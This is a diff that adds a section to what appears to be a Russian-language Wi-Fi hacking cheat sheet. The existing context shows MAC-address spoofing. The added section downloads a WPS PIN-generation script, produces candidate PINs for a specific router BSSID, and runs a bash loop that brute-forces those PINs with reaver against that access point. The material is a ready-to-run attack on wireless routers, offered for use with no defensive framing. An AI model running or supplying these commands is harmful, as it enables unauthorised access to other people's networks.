@@ -91,3 +91,21 @@ iw dev
     sudo macchanger wlan0 -m 3E:48:72:B7:62:2A
     sudo ifconfig wlan0 up
     Теперь подключаемся к сети 5 Ггц
+
+# WPS генеоация пинов
+
+    wget https://raw.githubusercontent.com/epicdev420/WPSPin/refs/heads/main/dist-packages/wpspin/wpspin.py
+    python -c "import wpspin; wpspin.main()" 11:22:33:44:55:66 -A
+    python -c "import wpspin; wpspin.main()" -A 60:38:E0:A2:3D:2A | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
+
+    #!/bin/bash
+
+    #We add generated PINs into this list
+    PINS='73834410 94229882 73834410 06490959 11184812 63311501 11184812 36499373 63313604 99956042 95661469 89478486 11184812 11184812 95755212 20854836 20144326 33946153 13142452 74163052 51875350 43977680 56587340 95719115 48563710 92148659 05294176 89532331 68175542 71412252 80652847 76229909 46264848 82799427 20233921 31957199 10864111 62327145 30432031 90970948 22369628 33554433 34259283 35611530 20172527 67958146 12345670 74244973'
+
+    for PIN in $PINS
+    do
+    echo Attempting PIN: $PIN
+    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN
+    done
+    echo "PIN Guesses Complete"
